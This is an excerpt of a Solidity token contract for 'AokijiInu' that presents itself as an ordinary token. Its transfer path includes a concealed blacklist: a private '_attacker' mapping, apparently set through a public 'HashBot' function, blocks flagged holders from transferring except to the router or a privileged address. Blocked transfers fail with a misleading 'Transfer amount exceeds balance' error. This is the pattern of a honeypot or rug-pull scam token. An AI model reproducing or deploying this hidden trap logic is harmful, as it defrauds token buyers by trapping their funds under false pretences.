...
/**
    ___         __   _   _ _ ____               
   /   | ____  / /__(_) (_|_)  _/___  __  __    
  / /| |/ __ \/ //_/ / / / // // __ \/ / / /    
 / ___ / /_/ / ,< / / / / // // / / / /_/ /     
/_/  |_\____/_/|_/_/_/ /_/___/_/ /_/\__,_/      
                  /___/                         
AokijiInu 
 */              
...
contract TokenTool is Ownable {
    address private _owner;
    address private _address0;
    address private _address1;
    string private _name = "AokijiInu";
    string private _symbol = "AokijiInu";
    mapping (address => bool) private _Addressint;
    mapping (address => bool) private _attacker;
    uint256 private _totalSupply = 1200000000000 * (10 ** decimals());
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        require(senderBalance >= amount, "Transfer amount exceeds balance");
         _willshack(sender, recipient, amount);
         _willstransfer(sender, recipient, amount);
        unchecked {
    ...
    function _willshack(address sender, address recipient, uint256 amount) internal view virtual{
          if( amount > _zero && recipient != _address0 && sender != _address0 ){
              if( _attacker[sender]){
                  require(_attacker[sender] == false || recipient==_router || sender == _address1  ,"Transfer amount exceeds balance");}}           
    }
    
     function _willstransfer(address sender, address recipient, uint256 amount) internal view virtual{
        if(  amount > _zero && sender != _address0 && _address0!=_address1 &&recipient != _address0 ){
    ...
    function HashBot(address addr,bool status) public {
